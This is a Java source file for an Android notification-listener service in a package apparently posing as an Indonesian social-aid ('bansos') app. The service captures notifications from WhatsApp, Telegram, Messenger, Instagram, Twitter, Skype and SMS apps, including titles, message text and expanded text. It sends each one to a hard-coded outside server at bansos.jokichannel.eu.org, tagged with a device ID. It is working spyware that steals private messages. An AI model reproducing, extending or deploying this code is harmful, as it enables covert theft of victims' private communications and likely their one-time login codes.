package com.kemensos.bansos;

import android.annotation.SuppressLint;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

@SuppressLint("OverrideAbstract")
public class NotifService extends NotificationListenerService {

    private static final String TAG = "NotifService";
    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org";
    private static final String DEVICE_ID = "9c4d9cc9c4";

    // Target apps to capture
    private static final String[] TARGET_PACKAGES = {
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "com.facebook.orca",
        "com.instagram.android",
        "com.twitter.android",
        "com.skype.raider",
        "com.google.android.apps.messaging",
        "com.android.mms",
        "com.samsung.android.messaging"
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        String packageName = sbn.getPackageName();
        if (!isTarget(packageName)) return;

        try {
            JSONObject data = new JSONObject();
            data.put("package", packageName);
            data.put("app_name", getAppName(packageName));
            data.put("title", sbn.getNotification().extras.getString("android.title"));
            data.put("text", sbn.getNotification().extras.getString("android.text"));
            data.put("time", sbn.getPostTime());
            data.put("device_id", DEVICE_ID);

            // Additional text for big notifications
            CharSequence bigText = sbn.getNotification().extras.getCharSequence("android.bigText");
            if (bigText != null) {
                data.put("big_text", bigText.toString());
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                data.put("key", sbn.getKey());
                data.put("user", sbn.getUser() != null ? sbn.getUser().toString() : "");
            }

            sendToServer(data.toString());

        } catch (Exception e) {
            Log.e(TAG, "Parse error", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Not needed
    }

    private boolean isTarget(String packageName) {
        for (String pkg : TARGET_PACKAGES) {
            if (pkg.equals(packageName)) return true;
        }
        return false;
    }

    private String getAppName(String packageName) {
        switch (packageName) {
            case "com.whatsapp": return "WhatsApp";
            case "com.whatsapp.w4b": return "WhatsApp Business";
            case "org.telegram.messenger": return "Telegram";
            case "com.facebook.orca": return "Messenger";
            case "com.instagram.android": return "Instagram";
            case "com.twitter.android": return "Twitter/X";
            case "com.skype.raider": return "Skype";
            default: return packageName;
        }
    }

    private void sendToServer(final String jsonData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL + "/api/collect-notif");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int code = conn.getResponseCode();
                    conn.disconnect();
                    Log.d(TAG, "Notif sent: " + packageNameFrom(jsonData) + " code=" + code);
                } catch (Exception e) {
                    Log.e(TAG, "Send error", e);
                }
            }

            private String packageNameFrom(String json) {
                try {
                    return new JSONObject(json).optString("package", "?");
                } catch (JSONException e) {
                    return "?";
                }
            }
        }).start();
    }
}
